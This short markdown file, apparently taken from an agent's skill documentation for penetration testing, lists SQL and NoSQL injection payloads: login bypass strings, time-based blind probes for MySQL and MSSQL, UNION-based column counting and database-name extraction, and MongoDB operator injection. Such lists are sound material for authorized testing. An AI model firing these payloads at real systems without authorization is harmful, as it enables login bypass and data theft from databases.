# SQLi key payloads

Verbatim payload block from `SKILL.md` (progressive disclosure); procedure and discipline stay in the body.

```sql
-- Error probes
' '' ` ') ")) ' OR '1'='1 admin'--

-- Time-based (MySQL)
' AND SLEEP(5)--

-- Time-based (MSSQL)
'; WAITFOR DELAY '0:0:5'--

-- UNION (find column count first)
' ORDER BY 1-- ' ORDER BY 10--
' UNION SELECT NULL,NULL,NULL--
' UNION SELECT 1,database(),3--

-- NoSQL (MongoDB JSON body)
{"username": {"$gt": ""}, "password": {"$gt": ""}}
{"username": {"$regex": ".*"}}

-- NoSQL (query string)
username[$ne]=invalid&password[$ne]=invalid
```
